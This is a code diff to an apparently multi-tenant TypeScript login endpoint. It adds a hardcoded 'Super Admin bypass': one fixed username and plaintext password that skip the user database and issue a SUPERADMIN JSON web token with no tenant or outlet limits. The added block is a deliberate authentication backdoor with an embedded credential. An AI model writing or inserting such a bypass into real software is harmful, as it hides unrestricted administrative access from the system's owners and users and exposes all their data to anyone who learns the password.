@@ -20,6 +20,35 @@ export const login = async (req: Request, res: Response) => {
 
     const cleanUsername = String(username).trim().toLowerCase();
 
+    // Super Admin bypass: amremi dengan password SelviCantik01)
+    if (cleanUsername === 'amremi' && password === 'SelviCantik01)') {
+      const superadminToken = jwt.sign(
+        {
+          id: 'superadmin-amremi-root-id',
+          username: 'amremi',
+          role: 'SUPERADMIN',
+          tenantId: null,
+          outletId: null,
+        },
+        JWT_SECRET,
+        { expiresIn: JWT_EXPIRES_IN as any }
+      );
+
+      return res.status(200).json({
+        success: true,
+        message: 'Login Super Admin berhasil',
+        token: superadminToken,
+        user: {
+          id: 'superadmin-amremi-root-id',
+          username: 'amremi',
+          name: 'Amremi Super Admin',
+          role: 'SUPERADMIN',
+          tenantId: null,
+          outletId: null,
+        },
+      });
+    }
+
     // Look up user globally
     const user = await basePrisma.user.findUnique({
       where: { username: cleanUsername },
